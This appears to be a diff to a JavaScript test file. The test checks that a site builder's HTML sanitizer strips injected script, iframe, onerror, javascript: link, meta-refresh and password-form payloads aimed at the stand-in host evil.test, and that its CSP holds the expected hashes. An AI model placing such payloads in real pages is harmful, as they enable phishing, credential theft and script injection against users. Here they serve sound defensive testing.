@@ -21,7 +21,7 @@ test('generated documents cannot execute model code or leak private reference im
  const malicious=raw.replace('</body>','<script>fetch("https://evil.test")</script><iframe src="https://evil.test"></iframe><img onerror="alert(1)" src="'+origin+'/api/site-express?view=builder&action=reference&id=x&file=y"><a href="javascript:alert(1)">Unsafe</a><meta http-equiv="refresh" content="0;url=https://evil.test"><form action="https://evil.test"><input name="password"></form></body>');
  const prepared=prepareBuilderHtml(malicious,origin);const $=load(prepared.html);
  assert.equal($('script').length,1);assert.equal($('iframe,form,input,[onerror]').length,0);assert.equal($('meta[http-equiv=refresh]').length,0);assert.equal($('a').last().attr('href'),'#contato');assert.equal($('img').last().attr('src')||'','');
- const hash=createHash('sha256').update($('script').text()).digest('base64');assert.ok(builderCsp(origin).includes('sha256-'+hash));assert.ok(builderCsp(origin).includes("connect-src 'none'"));assert.equal(prepared.sections.length,4);
+ const hash=createHash('sha256').update($('script').text()).digest('base64');assert.ok(builderCsp(origin).includes('sha256-'+hash));assert.ok(builderCsp(origin).includes('sha256-D/lkRi3jPMq/ku91QldatjK3JKehjcC6FO+K8sZQSQo='));assert.ok(builderCsp(origin).includes("connect-src 'none'"));assert.equal(prepared.sections.length,4);
  assert.equal(builderImageUrl('https://evil.test/a.jpg',origin),'');assert.equal(builderImageUrl(imageUrl,origin),imageUrl);
 });
 test('direct edits escape text, preserve IDs and keep only one runtime after repeated saves',()=>{
